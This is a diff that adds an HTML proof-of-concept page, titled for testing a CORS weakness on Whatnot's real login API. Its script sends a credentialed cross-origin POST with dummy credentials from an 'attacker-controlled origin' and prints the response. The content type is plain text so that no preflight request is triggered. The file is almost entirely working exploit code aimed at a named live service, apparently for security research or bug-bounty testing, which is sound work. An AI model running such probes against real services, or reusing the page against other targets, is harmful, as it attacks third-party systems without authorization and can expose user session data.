@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Whatnot Login CORS PoC</title>
+  <style>
+    body { font-family: sans-serif; margin: 24px; line-height: 1.4; }
+    textarea { width: 100%; min-height: 240px; }
+    button { padding: 8px 12px; margin-right: 8px; }
+  </style>
+</head>
+<body>
+  <h1>Whatnot Login CORS PoC</h1>
+  <p>Run this page from an attacker-controlled origin (not file://) to test cross-origin response readability.</p>
+  <button id="run">Run PoC Request</button>
+  <button id="clear">Clear</button>
+  <pre id="meta"></pre>
+  <textarea id="out" readonly></textarea>
+
+  <script>
+    const endpoint = 'https://www.whatnot.com/services/api/v2/login';
+    const out = document.getElementById('out');
+    const meta = document.getElementById('meta');
+
+    function log(line) {
+      out.value += line + '\n';
+    }
+
+    async function run() {
+      out.value = '';
+      meta.textContent = 'Origin: ' + location.origin + '\nEndpoint: ' + endpoint;
+
+      try {
+        const res = await fetch(endpoint, {
+          method: 'POST',
+          credentials: 'include',
+          mode: 'cors',
+          headers: {
+            'content-type': 'text/plain'
+          },
+          body: JSON.stringify({ email: 'a@b.c', password: 'x' })
+        });
+
+        log('status=' + res.status);
+        log('type=' + res.type);
+
+        const text = await res.text();
+        log('body=' + text);
+      } catch (e) {
+        log('error=' + (e && e.message ? e.message : String(e)));
+      }
+    }
+
+    document.getElementById('run').addEventListener('click', run);
+    document.getElementById('clear').addEventListener('click', () => {
+      out.value = '';
+      meta.textContent = '';
+    });
+  </script>
+</body>
+</html>
